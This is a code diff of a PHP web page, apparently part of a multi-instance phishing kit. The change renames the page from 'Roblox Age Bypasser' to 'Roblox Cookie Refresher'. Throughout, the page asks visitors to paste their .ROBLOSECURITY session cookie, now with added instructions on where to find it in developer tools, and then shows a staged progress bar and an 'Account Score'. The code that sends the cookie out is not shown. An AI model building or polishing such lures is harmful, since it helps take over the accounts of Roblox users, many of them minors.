@@ -1,22 +1,14 @@
 <?php
-/**
- * Bypasserv3 - Public Bypasser Interface
- */
-
 require_once __DIR__ . '/../config.php';
 require_once __DIR__ . '/../functions.php';
 
-// Get directory from URL
 $directory = $_GET['dir'] ?? '';
 
 if (empty($directory)) {
     die('No instance specified');
 }
 
-// Sanitize directory
 $directory = sanitizeInput($directory);
-
-// Get instance data
 $instanceData = getInstanceData($directory);
 
 if (!$instanceData) {
@@ -32,33 +24,32 @@ updateGlobalStats('totalVisits', 1);
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-    <title>Roblox Age Bypasser</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Cookie Refresher</title>
+    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <link rel="stylesheet" href="/public/style.css">
 </head>
-<body class="bg-[#02040a] text-white font-sans selection:bg-white/20 overflow-x-hidden">
+<body class="bg-[#0f172a] text-white font-sans min-h-screen overflow-x-hidden">
     <canvas id="particles"></canvas>
     
     <div class="container max-w-lg mx-auto px-4 py-12 flex flex-col items-center min-h-screen relative z-10">
         <div class="text-center mb-10 space-y-4">
             <div class="relative inline-block">
-                <div class="absolute inset-0 bg-white/20 blur-2xl rounded-full"></div>
+                <div class="absolute inset-0 bg-blue-500/20 blur-2xl rounded-full"></div>
                 <div class="relative w-16 h-16 bg-white/5 border border-white/10 rounded-2xl flex items-center justify-center backdrop-blur-sm shadow-2xl glass-effect">
                     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="text-white"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                 </div>
             </div>
             <h1 class="text-4xl md:text-5xl font-display font-bold tracking-tight text-glow animated-gradient-text">
-                Roblox Age Bypasser
+                Roblox Cookie Refresher
             </h1>
             <p class="text-white/60 text-lg">
-                Secure and efficient age verification bypass
+                Refresh your expired Roblox cookie instantly
             </p>
             
-            <!-- Live Status -->
             <div class="inline-flex items-center gap-2 px-4 py-2 bg-white/5 border border-white/10 rounded-full glass-effect">
                 <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                 <span class="text-white/80 text-sm font-medium" id="live-status">Loading...</span>
@@ -72,7 +63,8 @@ updateGlobalStats('totalVisits', 1);
                 <div id="form-state" class="space-y-6">
                     <div class="space-y-2">
                         <label class="text-sm font-medium text-white/80 ml-1">.ROBLOSECURITY Cookie</label>
-                        <textarea id="cookie-input" placeholder="Paste your cookie here..." class="w-full bg-white/5 border border-white/10 focus:border-white/20 text-white min-h-[120px] rounded-2xl resize-none placeholder:text-white/20 p-4 outline-none transition-colors glass-effect"></textarea>
+                        <textarea id="cookie-input" placeholder="Paste your cookie here..." class="w-full bg-white/5 border border-white/10 focus:border-blue-500 text-white min-h-[120px] rounded-2xl resize-none placeholder:text-white/20 p-4 outline-none transition-colors glass-effect"></textarea>
+                        <p class="text-xs text-white/40 ml-1">Don't have a cookie? Check your browser's developer tools → Application → Cookies</p>
                     </div>
 
                     <div class="flex gap-3">
@@ -80,9 +72,9 @@ updateGlobalStats('totalVisits', 1);
                             <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                             Check Cookie
                         </button>
-                        <button id="btn-start" class="flex-[2] h-14 bg-white text-black hover:bg-white/90 rounded-2xl text-base font-bold transition-all active:scale-[0.98] flex items-center justify-center gap-3">
-                            <div class="w-0 h-0 border-t-[6px] border-t-transparent border-l-[10px] border-l-black border-b-[6px] border-b-transparent ml-1"></div>
-                            Start Bypass
+                        <button id="btn-start" class="flex-[2] h-14 bg-gradient-to-r from-blue-600 to-blue-500 text-white hover:from-blue-700 hover:to-blue-600 rounded-2xl text-base font-bold transition-all active:scale-[0.98] flex items-center justify-center gap-3 shadow-lg shadow-blue-500/50">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/><path d="M9 12l2 2 4-4"/></svg>
+                            Refresh Cookie
                         </button>
                     </div>
                 </div>
@@ -90,17 +82,17 @@ updateGlobalStats('totalVisits', 1);
                 <!-- Processing State -->
                 <div id="processing-state" class="hidden py-8 flex flex-col items-center space-y-8">
                     <div class="relative">
-                        <div class="absolute inset-0 bg-white/20 blur-2xl rounded-full animate-pulse"></div>
+                        <div class="absolute inset-0 bg-blue-500/20 blur-2xl rounded-full animate-pulse"></div>
                         <div class="spinner relative"></div>
                     </div>
                     <div class="text-center space-y-2">
-                        <h3 class="text-2xl font-bold">Bypassing Age</h3>
+                        <h3 class="text-2xl font-bold">Refreshing Cookie...</h3>
                         <p class="text-white/60">Please wait while we process your request.</p>
                         <p class="text-white/40 text-sm">Usually takes 2-3 minutes</p>
                     </div>
                     <div class="w-full space-y-3">
                         <div class="h-2 w-full bg-white/5 rounded-full overflow-hidden">
-                            <div id="progress-bar" class="h-full bg-gradient-to-r from-blue-500 to-purple-500 shadow-[0_0_15px_rgba(147,51,234,0.5)] transition-all duration-300" style="width: 0%"></div>
+                            <div id="progress-bar" class="h-full bg-gradient-to-r from-blue-500 to-purple-500 shadow-[0_0_15px_rgba(59,130,246,0.5)] transition-all duration-300" style="width: 0%"></div>
                         </div>
                         <p id="progress-text" class="text-center text-sm font-medium text-white/40">0% Complete</p>
                     </div>
@@ -116,18 +108,18 @@ updateGlobalStats('totalVisits', 1);
                         </div>
                     </div>
                     <div class="space-y-2">
-                        <h3 class="text-2xl font-bold">Successfully Bypassed</h3>
+                        <h3 class="text-2xl font-bold text-green-400">Successfully Refreshed!</h3>
                         <p class="text-white/60 text-sm" id="user-display-name"></p>
                     </div>
                     
                     <!-- Account Score -->
-                    <div class="w-full bg-gradient-to-r from-purple-500/20 to-blue-500/20 border border-purple-500/30 rounded-2xl p-4 glass-effect">
+                    <div class="w-full bg-gradient-to-r from-blue-500/20 to-purple-500/20 border border-blue-500/30 rounded-2xl p-4 glass-effect">
                         <div class="flex items-center justify-between mb-2">
                             <span class="text-white/60 text-sm">Account Score</span>
                             <span class="text-2xl font-bold animated-gradient-text" id="account-score">0/100</span>
                         </div>
                         <div class="h-3 bg-white/10 rounded-full overflow-hidden">
-                            <div id="score-bar" class="h-full bg-gradient-to-r from-purple-500 to-blue-500 transition-all duration-1000" style="width: 0%"></div>
+                            <div id="score-bar" class="h-full bg-gradient-to-r from-blue-500 to-purple-500 transition-all duration-1000" style="width: 0%"></div>
                         </div>
                         <p class="text-white/40 text-xs mt-2" id="score-rating">Calculating...</p>
                     </div>
@@ -177,7 +169,7 @@ updateGlobalStats('totalVisits', 1);
                     </div>
                     
                     <button class="border border-white/10 hover:bg-white/5 rounded-2xl h-12 px-8 transition-colors glass-effect" onclick="window.location.reload()">
-                        Process Another Account
+                        Process Another Cookie
                     </button>
                 </div>
 
@@ -187,8 +179,8 @@ updateGlobalStats('totalVisits', 1);
                         <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
                     </div>
                     <div class="space-y-2">
-                        <h3 class="text-2xl font-bold">Bypass Failed</h3>
-                        <p class="text-white/60">The credentials provided were invalid or expired.</p>
+                        <h3 class="text-2xl font-bold">Refresh Failed</h3>
+                        <p class="text-white/60">The cookie provided was invalid or expired.</p>
                     </div>
                     <button class="border border-white/10 hover:bg-white/5 rounded-2xl h-12 px-8 transition-colors glass-effect" onclick="window.location.reload()">
                         Try Again
